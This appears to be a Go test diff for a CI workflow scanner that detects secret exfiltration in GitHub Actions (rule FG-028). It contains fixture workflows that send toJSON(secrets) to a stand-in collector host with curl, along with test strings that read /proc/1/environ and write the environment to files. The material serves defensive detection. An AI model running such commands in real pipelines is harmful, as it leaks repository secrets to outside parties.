@@ -1391,6 +1391,142 @@ func TestCheckLabelGateTOCTOU_Safe(t *testing.T) {
 	}
 }
 
+// --- FG-028 Secret Exfiltration Behavior tests ---
+
+// Each job in the fixture exhibits one exfiltration signal; expect exactly
+// one finding per job at the listed severity.
+func TestCheckSecretExfiltration(t *testing.T) {
+	wf := loadFixture(t, "secret-exfil.yaml")
+	findings := CheckSecretExfiltration(wf)
+
+	want := map[string]string{
+		"mem-scrape":              SeverityCritical,
+		"gdb-runner":              SeverityCritical,
+		"environ-sweep":           SeverityCritical,
+		"environ-scrub-assertion": SeverityMedium,
+		"runner-environ-sent":     SeverityCritical,
+		"secrets-callback":        SeverityCritical,
+		"secrets-curl":            SeverityCritical,
+		"secrets-script":          SeverityCritical,
+		"env-curl":                SeverityCritical,
+		"env-grep-secrets":        SeverityCritical,
+		"env-script":              SeverityCritical,
+		"secrets-colocated":       SeverityHigh,
+	}
+	got := map[string]string{}
+	for _, f := range findings {
+		if f.RuleID != "FG-028" {
+			t.Errorf("expected FG-028, got %s", f.RuleID)
+		}
+		for job := range want {
+			if strings.Contains(f.Message, "job "+job+" ") {
+				if _, dup := got[job]; dup {
+					t.Errorf("job %s: more than one finding", job)
+				}
+				got[job] = f.Severity
+			}
+		}
+	}
+	if len(findings) != len(want) {
+		t.Errorf("expected %d findings, got %d: %v", len(want), len(findings), findings)
+	}
+	for job, sev := range want {
+		if got[job] != sev {
+			t.Errorf("job %s: expected severity %q, got %q", job, sev, got[job])
+		}
+	}
+}
+
+// The raw-IP callback finding names the endpoint so responders can block it.
+func TestCheckSecretExfiltration_CallbackIPInMessage(t *testing.T) {
+	wf := loadFixture(t, "secret-exfil.yaml")
+	for _, f := range CheckSecretExfiltration(wf) {
+		if strings.Contains(f.Message, "job secrets-callback ") {
+			if !strings.Contains(f.Message, "203.0.113.10") {
+				t.Errorf("expected callback IP in message, got: %s", f.Message)
+			}
+			return
+		}
+	}
+	t.Fatal("no finding for secrets-callback")
+}
+
+// Legitimate lookalikes: sandbox self-checks naming Runner.Worker, reading a
+// single PID's environ, loading toJSON(secrets) into env, plain downloads,
+// grep-filtered non-secret env reports, private-IP deploy targets, and port
+// waits with nc.
+func TestCheckSecretExfiltration_Lookalikes(t *testing.T) {
+	wf := loadFixture(t, "secret-exfil-safe.yaml")
+	findings := CheckSecretExfiltration(wf)
+	if len(findings) != 0 {
+		t.Fatalf("expected 0 findings for lookalikes, got %d: %v", len(findings), findings)
+	}
+}
+
+func TestCheckSecretExfiltration_Safe(t *testing.T) {
+	wf := loadFixture(t, "safe-workflow.yaml")
+	findings := CheckSecretExfiltration(wf)
+	if len(findings) != 0 {
+		t.Fatalf("expected 0 findings for safe workflow, got %d", len(findings))
+	}
+}
+
+// toJSON(secrets) in workflow- or job-level env is in scope for every step
+// of the job, so a step that sends the variable is flagged.
+func TestCheckSecretExfiltration_ScopedEnv(t *testing.T) {
+	for _, tc := range []struct {
+		name string
+		yaml string
+	}{
+		{"workflow env", `on: push
+env:
+  S: ${{ toJSON(secrets) }}
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -s --data "$S" https://collector.example.com
+`},
+		{"job env", `on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      S: ${{ toJSON(secrets) }}
+    steps:
+      - run: curl -s --data "$S" https://collector.example.com
+`},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			wf, err := ParseWorkflow([]byte(tc.yaml), "test.yml")
+			if err != nil {
+				t.Fatal(err)
+			}
+			findings := CheckSecretExfiltration(wf)
+			if len(findings) != 1 || findings[0].Severity != SeverityCritical {
+				t.Fatalf("expected 1 critical finding, got %v", findings)
+			}
+		})
+	}
+}
+
+func TestPublicIPURL(t *testing.T) {
+	for in, want := range map[string]string{
+		"http://203.0.113.10:8080/x":  "203.0.113.10",
+		"tcp://198.51.100.7:4444":     "198.51.100.7",
+		"http://127.0.0.1:8080":       "",
+		"http://10.1.2.3/deploy":      "",
+		"http://192.168.1.1":          "",
+		"http://169.254.169.254/meta": "",
+		"http://999.1.1.1":            "",
+		"https://example.com":         "",
+	} {
+		if got := publicIPURL(in); got != want {
+			t.Errorf("publicIPURL(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
+
 // --- FG-017 GitHub Script Injection tests ---
 
 func TestCheckGitHubScriptInjection(t *testing.T) {
@@ -1417,5 +1553,38 @@ func TestCheckGitHubScriptInjection_Safe(t *testing.T) {
 	findings := CheckGitHubScriptInjection(wf)
 	if len(findings) != 0 {
 		t.Fatalf("expected 0 findings for safe workflow, got %d", len(findings))
+	}
+}
+
+func TestWritesToFile(t *testing.T) {
+	for in, want := range map[string]bool{
+		`cat /proc/1/environ > /tmp/e.txt`:           true,
+		`done >> "$D/out.txt"`:                       true,
+		`env | tee /tmp/e`:                           true,
+		`tr '\0' '\n' < "$e" 2>/dev/null`:            false,
+		`cmd >/dev/null 2>&1`:                        false,
+		`cmd > "/dev/null"`:                          false,
+		`echo "::error::reads /proc/<pid>/environ."`: false,
+		`echo 'a > b'`:                               false,
+	} {
+		if got := writesToFile(in); got != want {
+			t.Errorf("writesToFile(%q) = %v, want %v", in, got, want)
+		}
+	}
+}
+
+func TestContainsFold(t *testing.T) {
+	for _, tc := range []struct {
+		s, sub string
+		want   bool
+	}{
+		{"${{ toJSON(SECRETS) }}", "secrets", true},
+		{"pgrep RUNNER.Worker", "runner.", true},
+		{"secret", "secrets", false},
+		{"", "secrets", false},
+	} {
+		if got := containsFold(tc.s, tc.sub); got != tc.want {
+			t.Errorf("containsFold(%q, %q) = %v, want %v", tc.s, tc.sub, got, tc.want)
+		}
 	}
 }
